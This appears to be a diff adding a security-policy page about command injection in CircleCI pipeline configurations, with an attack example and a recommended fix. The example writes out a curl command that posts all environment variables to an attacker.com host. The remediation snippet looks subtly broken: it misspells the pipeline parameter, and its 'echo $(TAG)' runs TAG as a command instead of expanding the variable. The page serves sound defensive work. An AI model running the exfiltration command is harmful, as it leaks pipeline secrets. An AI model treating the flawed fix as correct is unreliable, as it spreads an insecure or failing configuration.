@@ -1,0 +1,71 @@
+== CirceCI pipeline vulnerable to command injection 
+
+=== Policy Details 
+
+[width=45%]
+[cols="1,1"]
+|=== 
+
+|Prisma Cloud Policy ID 
+|86219273-ec96-4598-8011-fbf6821e022d 
+
+|Severity
+|Critical
+// add severity level
+
+|Category
+|Input Validation
+// add category+link
+
+|Subtype
+|Build
+// add subtype-build/runtime
+
+|Frameworks
+|CircleCI
+
+|=== 
+
+=== Description 
+
+Pipelines are vulnerable to command injection attacks, in which arbitrary commands and scripts are passed through user controlled inputs such as pull request title, commit description and so on. These inputs can then be referenced by the pipeline configuration file and executed as part of the pipeline job.
+
+When the pipeline job runs, the poisoned controlled inputs can be interpreted as code and executed on the runner, enabling remote code execution attacks to take place. This will allow the attacker to access stored secrets or to read or modify the source code. 
+
+*EXAMPLE*
+
+The following code snippet is designed to print the associated git tag:
+
+[source,unset]
+----
+steps: 
+ - run: echo << pipline.git.tag >>
+----
+
+Attackers can inject their own commands by creating the git tag value:
+
+`curl -X POST -d $(env) https://attacker.com/exfiltrate`
+
+After the pipeline is triggered, this string will be evaluated and executed in the context of the pipeline. As a result, the environment variables will be sent to the attackers' server.
+
+=== Recommended Solution - Buildtime
+
+Pipelines should never run unsanitized and/or untrusted input. To mitigate command injection attacks, the recommended approach is to assign the value of the expression to an intermediate environment variable. This will cause command injection attacks to fail.
+
+*EXAMPLE*
+
+[source,unset]
+----
+environment:
+ TAG: << pipline.git.tag >>
+steps: 
+- run: echo $(TAG)
+----
+
+
+
+
+
+
+
+
